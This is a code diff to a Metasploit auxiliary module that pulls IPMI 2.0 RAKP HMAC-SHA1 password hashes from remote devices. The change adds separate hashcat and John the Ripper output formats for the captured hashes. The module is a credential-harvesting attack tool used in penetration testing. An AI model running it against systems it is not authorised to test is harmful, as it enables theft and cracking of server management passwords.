@@ -1,4 +1,4 @@
-##
+#
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'IPMI 2.0 RAKP Remote Password Hash Retreival',
+			'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retreival',
 			'Description' => %q|
 				This module identifies IPMI 2.0 compatible systems and attempts to retrieve the 
 				HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a 
@@ -41,7 +41,8 @@ class Metasploit3 < Msf::Auxiliary
 			OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
 				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
 			]),			
-			OptString.new('OUTPUT_FILE', [false, "File to save captured password hashes into"]),
+			OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
+			OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
 			OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
 		], self.class)
 
@@ -95,14 +96,14 @@ class Metasploit3 < Msf::Auxiliary
 				end
 
 				unless r
-					vprint_status("#{rhost} No response to IPMI open session request, stopping test")
+					vprint_status("#{rhost} No response to IPMI open session request")
 					rakp = nil 
 					break
 				end
 				
 				sess = process_opensession_reply(*r)
 				unless sess
-					vprint_status("#{rhost} Could not understand the response to the open session request, stopping test")
+					vprint_status("#{rhost} Could not understand the response to the open session request")
 					rakp = nil 
 					break
 				end
@@ -164,12 +165,18 @@ class Metasploit3 < Msf::Auxiliary
 				username
 			)
 
-			found = "#{rhost} #{username}:#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}"
+			sha1_salt = hmac_buffer.unpack("H*")[0]
+			sha1_hash = rakp.hmac_sha1.unpack("H*")[0]
+
+			found = "#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}"
 			print_good(found)
 
-			# Write the rakp hash to the output file 
-			if @output
-				@output.write(found + "\n")
+			# Write the rakp hash to the output files
+			if @output_cat
+				@output_cat.write("#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}\n")
+			end
+			if @output_jtr
+				@output_jtr.write("#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\n")
 			end
 
 			# Write the rakp hash to the database
@@ -179,7 +186,7 @@ class Metasploit3 < Msf::Auxiliary
 				:proto  => 'udp',
 				:sname	=> 'ipmi',
 				:user 	=> username,
-				:pass   => "#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}",
+				:pass   => "#{sha1_salt}:#{sha1_hash}",
 				:source_type => "captured",
 				:active => true,
 				:type   => 'rakp_hmac_sha1_hash'
@@ -261,16 +268,22 @@ class Metasploit3 < Msf::Auxiliary
 
 	def setup
 		super
-		@output = nil
-		if datastore['OUTPUT_FILE']
-			@output = ::File.open(datastore['OUTPUT_FILE'], "ab")
+		@output_cat = nil
+		@output_jtr = nil
+		if datastore['OUTPUT_HASHCAT_FILE']
+			@output_cat = ::File.open(datastore['OUTPUT_HASHCAT_FILE'], "ab")
+		end
+		if datastore['OUTPUT_JOHN_FILE']
+			@output_jtr = ::File.open(datastore['OUTPUT_JOHN_FILE'], "ab")
 		end
 	end
 
 	def cleanup
 		super
-		@output.close if @output
-		@output = nil
+		@output_cat.close if @output_cat
+		@output_cat = nil
+		@output_jtr.close if @output_jtr
+		@output_jtr = nil
 	end
 
 	#
